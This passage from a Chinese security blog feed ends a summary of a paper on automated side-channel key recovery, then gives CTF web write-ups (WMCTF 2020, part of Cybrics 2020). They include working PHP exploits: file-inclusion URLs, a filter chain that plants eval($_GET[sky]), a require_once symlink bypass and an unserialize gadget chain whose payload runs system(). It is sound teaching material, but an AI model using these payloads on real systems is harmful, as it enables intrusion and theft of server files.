alt=""><br>同时差分进化遗传算法需要一个适应度函数来进行评估当前指令序列的质量，看该指令序列是否能够产生可区分目标程序执行到不同代码路径的度量信号。<br>这里作者使用了高斯朴素贝叶斯分类器来进行评估。原因是该分类器在不需要调参的情况下表现良好，同时其在training和evaluation时具有线性的时间复杂度，可以保证差分进化遗传算法能够快速进行。<br>然后作者使用信号值来训练该分类器，这些信号值来自于目标程序执行到某个代码路径时，我们的指令序列产生的信号，我们根据我们之前对目标程序插入的指令，来标记其对应是否执行的该代码路径，例如0和1。<br>同时作者为了证明优化指令序列的重要性，在目标程序Broadwell-NIST-P256上进行了对比实验。<br>优化前：<br><img src="/images/2020-08-11-11-03-07.png" alt=""><br>优化后：<br><img src="/images/2020-08-11-11-03-12.png" alt=""><br>我们可以看到，在仅使用性能最好的单一指令时，PCA图分界不够明显，特征不够明显。而在使用算法优化后的指令序列时，PCA图分界比较明显，因此说明这样的指令序列获取的信号度量更加具有特征性。<br>第3个难题是在之前的训练中，由于数据的搜集一直是保持同步的，因此我们可以容易知道程序开始的起点位置和长度，因此分类器可以简单的得到相关的密钥值。但是在真实世界的攻击中，我们获取的信号很可能是多个从未知位置开始的连续信号，这就比较困难。同时在长时间捕获信号的过程中，很容易失去同步。因此之前标记对应代码执行路径和延迟时间的方式在这里不可行。<br>为了解决这一问题，作者使用时间序列为向量，选择了一种专门针对时间序列数据的LSTM RNN算法，该算法在不完全同步的情况下具有鲁棒性，在信号发生微小时间偏移时，允许非同步的恢复密钥。<br>作者同时提到，可以有方法验证恢复密钥的正确性，例如目标程序在签名操作时，会使用密钥。那么作者也将恢复的密钥用于一次签名操作，如果签名相同，则说明密钥正确，否则则说明密钥错误。然后作者发现，恢复的密钥往往都是不正确的。可能是密钥某bit位丢失，或者是恢复错误。<br>但是每次密钥恢复错误时，可能都需要对上百个bit位进行爆破，以找到正确的密钥，但这样的操作显然不可取，例如一个384bit的密钥，如果有n个bit猜测错误或者丢失，那么需要进行384^n次爆破，这显然不可行。<br>但这里作者提到，由于考虑了时间序列问题，现在的算法的返回值是(time, secret)，因此可以容易知道哪一位可能存在丢失或错误。因为丢失的时候，2个bit位之间会形成较大的时间间隙，而错误的时候，2个bit位之间会出现很窄的时间间隙。对于每一个可能出问题的bit位，一共只有3种情况，第一种是该位正常，忽略，第二种是该位丢失或错误应该改为0，第3种是该位丢失或错误，应该改为1。因此在密钥恢复错误的情况下，如果有n个位置错误，那么只需要进行3^n次爆破来恢复密钥。<br>考虑到上述原因，作者为了解决这一问题，使用了2个LSTM模型，在恢复密钥时，如果2个模型预测值相同，那么才会接受。<br>这两个模型，第一个是三层LSTM嵌套的模型，第二个模型是LSTM接一个激活函数RELU的全连接层*3的模型。这两个模型都用0.2的 dropout 来缓解过拟合问题 并且由于是个多分类任务，输出都用的softmax layer。然后它使用集成学习（Ensemble）的方式把两个模型组合在一起，以获得更好的效果。<br>这里的训练数据特征是延迟值，训练集的样本分为两类，一类是从程序已知的开始位置开始，另一类是从程序未知的开始位置开始。</li></ol><h2 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h2><p>作者使用了libgcrypt 1.6.3和libgcrypt 1.8.5中的加密函数EdDSA 25519、EdDSA 25519-hardened、EdDSA 25519-secure (1.8.5 only)、RSA、ECDSA P-256作为攻击目标进行实现评估。值得注意的是，EdDSA 25519-hardened中已经对侧信道攻击有了基本的防御机制，而EdDSA 25519-secure对于侧信道的防御机制被认为是最先进的。<br>作者在4个不同的微架构上进行了测试，使用F1分数来评估工具的性能。<br><img src="/images/2020-08-11-11-09-52.png" alt=""><br>这里值得注意的是，在ARM上，作者是人工编写的指令序列。这里原因是，对于ARM没有完整的leakage map，无法遍历测试。而另外3个x86微架构，作者测试了所有可能的指令，并使用了4条最好的指令序列。这也体现出，作者的工具要比人工编写指令序列性能高的多。<br>同时注意到红框部分，由于这一条表现的性能非常好，作者选用其进行测试，看其在信息不同步的情况下，对密钥的恢复能力如何。<br><img src="/images/2020-08-11-11-10-40.png" alt=""><br>作者对这些目标在信息不同步的情况下，进行了7次测试。可以发现再非GPG的情况下，正确恢复密钥的准确率在100%，而在GPG情况下有一定错误。即在无外部提示或者分析人员设置的情况下，密钥相关分支完全由工具自动的进行识别。<br>同时作者将自己工具优化生成的指令序列与其他工作人工构造的指令序列进行了性能比对。<br><img src="/images/2020-08-11-11-12-43.png" alt=""><br>可以发现工具自动优化得到的指令序列，性能高于其他人工构造的指令序列。<br>同时从两个维度来验证工具的鲁棒性。首先是能否自动的找到我们感兴趣的分支，即密钥相关的内容。<br>这里作者选择在完全无侧信道防御的EdDSA 25519算法上进行了7次测试，可以发现在密钥相关程序开始时和其他时候有显著的差异。说明工具在我们感兴趣的区域预测密度显著较高，证明了工具的可靠性。<br><img src="/images/2020-08-11-11-12-52.png" alt=""><br>第二个维度，作者从被干扰的情况下，测试工具的鲁棒性。这里作者使用usleep函数，来干扰cpu的执行时间，干扰量为0.1%~30.6%。<br><img src="/images/2020-08-11-11-13-33.png" alt=""><br>这里我们可以发现2个点，第一点是即使目标程序存在噪音，密钥恢复的准确度都不会有太多变化，这是因为我们前面介绍过，密钥的恢复算法具有鲁棒性，可以抵御干扰。第二点是，我们的侧信道程序上如果出现噪音，则会受到影响，因为这涉及到了信号采集问题，如果信号不能准确采集，那么则无法进行密钥的恢复。<br>当然工具也有一些局限性。<br>首先工具要求目标软件会在加密运行时花费较长时间。同时密钥需要从文件系统中进行加载，否则无法进行自动污点分析。<br>第二点是工具需要目标微架构的指令集定义格式易于创建leakage map，才能使用工具的方法自动生成并优化指令序列。这一点在x86上比较容易获得，但是对于ARM还不行。<br>第三点是工具在后续的处理阶段，可以有更为自动化的方式，通过暴力破解启发式的方法来应用于各种程序。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章第一个创建了在x86微架构上完整的leakage maps，并实现了一个全自动的侧信道攻击，其可以利用资源竞争的方式，对各种平台，各种环境上的加密程序来进行侧信道攻击。对于前人工作具有比较高的创新性，同时为后续侧信道攻击测试提供了便捷性。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章是发表在NDSS2020上，有关于微架构侧信道攻击的一篇文章。一作来自于英特尔公司，先前在硬件和底层上有比较多的研究。文章标题中的几
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>2020 WMCTF Online Web Writeup</title>
    <link href="http://skysec.top/2020/08/01/2020-WMCTF-Online-Web-Writeup/"/>
    <id>http://skysec.top/2020/08/01/2020-WMCTF-Online-Web-Writeup/</id>
    <published>2020-08-01T01:11:27.000Z</published>
    <updated>2020-08-05T03:18:45.585Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末打了下WMCTF，Web题量大且大多需要细致推敲，以下是部分Web题解。</p><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><p>签到题不多说了，似乎是出题的时候，忘记改flag名了……直接包含即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web_checkin.wmctf.wetolink.com/?content=/flag</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-01-09-26-04.png" alt=""></p><h2 id="no-body-knows-php-better-than-me"><a href="#no-body-knows-php-better-than-me" class="headerlink" title="no_body_knows_php_better_than_me"></a>no_body_knows_php_better_than_me</h2><p>题目如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">'file'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>题目只给了require_once函数，由于flag.php被包含过，所以无法读取其内容。那么需要思考一些方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. getshell</span><br><span class="line">2. bypass require_once check</span><br></pre></td></tr></table></figure></p><p>这里先讲第一种做法，因为这题环境配置出现了非预期= =：<br><img src="/images/2020-08-01-19-32-53.png" alt=""><br>我们可以利用session upload progress来控制session文件内容，并进行文件包含：<br><img src="/images/2020-08-01-19-33-03.png" alt=""><br>从而达成getshell的目的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/tmp/skysec&amp;skysec=system(&apos;cat flag.php&apos;);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-01-19-33-20.png" alt=""><br>这个解法已经烂大街了，就不具体分析了~</p><h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a>web_checkin2</h2><p>题目修正了之前的非预期，修改了flag名字：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">'/var/www/html/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/iconv|UCS|UTF|rot|quoted|base64/i'</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">'&lt;?php exit();'</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在该篇文章里已经有一定的分析了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/202510</span><br></pre></td></tr></table></figure></p><p>但文章中涉及的内容都被waf拦截了，这里有2种方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.想出一个新的办法</span><br><span class="line">2.利用file_put_content会解url编码的特性，进行2次编码绕过</span><br></pre></td></tr></table></figure></p><p>二次编码就不提了，这里简单看一下新的方法，可以利用zlib.deflate和zlib.inflate解压缩的方式来绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content=urldecode(&apos;php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=?&gt;&lt;?php%0deval($_GET[sky]);?&gt;&apos;);</span><br></pre></td></tr></table></figure></p><p>成功getshell:<br><img src="/images/2020-08-02-18-14-49.png" alt=""><br>读取flag文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffffllllllllaaaaaggggggg_as89c79as8</span><br></pre></td></tr></table></figure></p><p>获得flag：<br><img src="/images/2020-08-02-18-17-27.png" alt=""></p><h2 id="Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again 2.0"></a>Make PHP Great Again 2.0</h2><p>此题修复了之前可用session upload progress进行getshell的非预期解法，那么只能尝试进行require_once的绕过了，分析到其实现源码：<br><img src="/images/2020-08-02-20-24-09.png" alt=""><br>发现require文件时，在对软链接的操作上存在一些缺陷，似乎并不会进行多次解析获取真实路径。<br>但是如何找到flag.php文件的软链接呢？这里可以再如下路径中发现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/var/www/html/index.php</span><br></pre></td></tr></table></figure></p><p>我们尝试套娃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/index.php</span><br></pre></td></tr></table></figure></p><p>发现可以成功包含文件：<br><img src="/images/2020-08-03-14-33-39.png" alt=""><br>那么使用伪协议来读取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://v2222.no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-02-20-44-59.png" alt=""></p><h2 id="webweb"><a href="#webweb" class="headerlink" title="webweb"></a>webweb</h2><p>题目又是给了一个反序列化语句:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize($_GET[<span class="string">'a'</span>]);</span><br></pre></td></tr></table></figure></p><p>考察对gadget的串联能力。<br>这里还是从<strong>destruct入手，选择CLI\Agent::</strong>destruct：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">'disconnect'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $func=<span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">'disconnect'</span>];</span><br><span class="line">        <span class="keyword">if</span>(is_callable($func))&#123;</span><br><span class="line">            $func(<span class="keyword">$this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处根据：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;server-&gt;events[<span class="string">'disconnect'</span>]</span><br></pre></td></tr></table></figure></p><p>我们可以尝试将$func控制为任意函数，随便选择一个类来使用：<br><img src="/images/2020-08-03-15-35-54.png" alt=""><br>那么选择哪个函数来使用进行RCE就非常重要，这里由于无法控制参数，因此直接找php built-in函数或许不行。那么只能考虑构造__call的方法，来进行攻击，搜寻类似于如下情况的例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$xxx-&gt;xxxx(<span class="keyword">$this</span>-&gt;xxxx)</span><br></pre></td></tr></table></figure></p><p>观察上述格式的语句可能出现的函数，然后兴许可以触发<strong>call，并且达到参数可控的目的。<br>这里搜罗一番，可以找到CLI\Agent::fetch：<br><img src="/images/2020-08-03-15-38-26.png" alt=""><br>此处，我们发现目标对象可控，参数可控，天时地利人和，只差危险的</strong>call函数。<br>这里搜索<strong>call函数需要优先考虑函数名可控情况，这里搜寻可发现DB\SQL\Mapper::</strong>call:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func,$args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(</span><br><span class="line">(array_key_exists($func,<span class="keyword">$this</span>-&gt;props)?</span><br><span class="line"><span class="keyword">$this</span>-&gt;props[$func]:</span><br><span class="line"><span class="keyword">$this</span>-&gt;$func),$args</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其函数名为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;props[$func]</span><br></pre></td></tr></table></figure></p><p>完全可以通过数组进行bypass。<br>因此可构造exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">props</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($props)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;props = $props;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">server</span>;</span><br><span class="line">        <span class="keyword">protected</span> $socket;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($server,$socket)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = $server;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;socket= $socket;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $events = [];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Image</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">events</span> = [];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> DB\SQL\Mapper(<span class="keyword">array</span>(<span class="string">"read"</span>=&gt;<span class="string">"system"</span>));</span><br><span class="line">    $b= <span class="keyword">new</span> CLI\Agent($a,<span class="string">'cat /etc/flagzaizheli'</span>);</span><br><span class="line">    $c = <span class="keyword">new</span> Image(<span class="keyword">array</span>(<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>($b,<span class="string">'fetch'</span>)));</span><br><span class="line">    $d = <span class="keyword">new</span> CLI\Agent($c,<span class="string">''</span>);</span><br><span class="line">    $e = <span class="keyword">new</span> CLI\WS($d);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($e)).<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>当然这里在测试时，发现直接使用CLI\Agent不行，在autoload时：<br><img src="/images/2020-08-03-15-42-05.png" alt=""><br>发现文件包含错误，导致我们反序列化时，找不到类的定义：<br><img src="/images/2020-08-03-15-42-26.png" alt=""><br>于是先从CLI\WS入手，让其包含正确的CLI\Agent定义文件：<br><img src="/images/2020-08-03-15-20-24.png" alt=""><br>我们来获取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://webweb.wmctf.wetolink.com/?a=O%3A6%3A%22CLI%5CWS%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A5%3A%22Image%22%3A1%3A%7Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A4%3A%22read%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A2%3A%22ls%22%3B%7Di%3A1%3Bs%3A5%3A%22fetch%22%3B%7D%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A0%3A%22%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-03-15-44-24.png" alt=""><br>寻找flag文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> DB\SQL\Mapper(<span class="keyword">array</span>(<span class="string">"read"</span>=&gt;<span class="string">"system"</span>));</span><br><span class="line">    $b= <span class="keyword">new</span> CLI\Agent($a,<span class="string">'find / | grep flag'</span>);</span><br><span class="line">    $c = <span class="keyword">new</span> Image(<span class="keyword">array</span>(<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>($b,<span class="string">'fetch'</span>)));</span><br><span class="line">    $d = <span class="keyword">new</span> CLI\Agent($c,<span class="string">''</span>);</span><br><span class="line">    $e = <span class="keyword">new</span> CLI\WS($d);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($e)).<span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-03-15-45-04.png" alt=""><br>获取flag：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> DB\SQL\Mapper(<span class="keyword">array</span>(<span class="string">"read"</span>=&gt;<span class="string">"system"</span>));</span><br><span class="line">    $b= <span class="keyword">new</span> CLI\Agent($a,<span class="string">'cat /etc/flagzaizheli'</span>);</span><br><span class="line">    $c = <span class="keyword">new</span> Image(<span class="keyword">array</span>(<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>($b,<span class="string">'fetch'</span>)));</span><br><span class="line">    $d = <span class="keyword">new</span> CLI\Agent($c,<span class="string">''</span>);</span><br><span class="line">    $e = <span class="keyword">new</span> CLI\WS($d);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($e)).<span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-08-03-15-45-57.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这次比赛web题量太大，还有一些题目值得推敲，后续有空复现再继续写吧XD~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;周末打了下WMCTF，Web题量大且大多需要细致推敲，以下是部分Web题解。&lt;/p&gt;
&lt;h2 id=&quot;web-checkin&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2020 Cybrics CTF Web Writeup</title>
    <link href="http://skysec.top/2020/07/25/2020-Cybrics-CTF-Web-Writeup/"/>
    <id>http://skysec.top/2020/07/25/2020-Cybrics-CTF-Web-Writeup/</id>
    <published>2020-07-25T14:26:55.000Z</published>
    <updated>2020-07-26T14:05:36.270Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末打了俄罗斯知名战队LCBC举办的2020 Cybrics CTF，以下是Web题题解。</p><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>锁定到会飘的验证码代码上，将其飘来飘去的代码去除：<br><img src="/images/2020-07-25-22-54-28.png" alt=""><br>然后手动调用5次固定不动的验证码：<br><img src="/images/2020-07-25-22-54-45.png" alt=""><br>此时验证码不动，点5次就可以去Get Flag了：<br><img src="/images/2020-07-25-22-54-56.png" alt=""><br>获得flag：<br><img src="/images/2020-07-25-22-54-00.png" alt=""></p><h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>题目给了源码，于是进行审计，关键代码如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = request.files[<span class="string">'file'</span>]</span><br><span class="line">logging.debug(<span class="string">f"Created: <span class="subst">&#123;uid&#125;</span>. Command: ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"</span>uploads/&#123;uid&#125;/%<span class="number">03</span>d.png\<span class="string">""</span>)</span><br><span class="line">command = subprocess.Popen(<span class="string">f"ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"</span>uploads/&#123;uid&#125;/%<span class="number">03</span>d.png\<span class="string">""</span>, shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><p>我们发现file.filename会被拼进 subprocess.Popen，从而导致可能存在命令注入，于是查看file.filename相关的过滤：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">            logging.debug(<span class="string">f'Invalid file extension of file: <span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid file extension'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line"><span 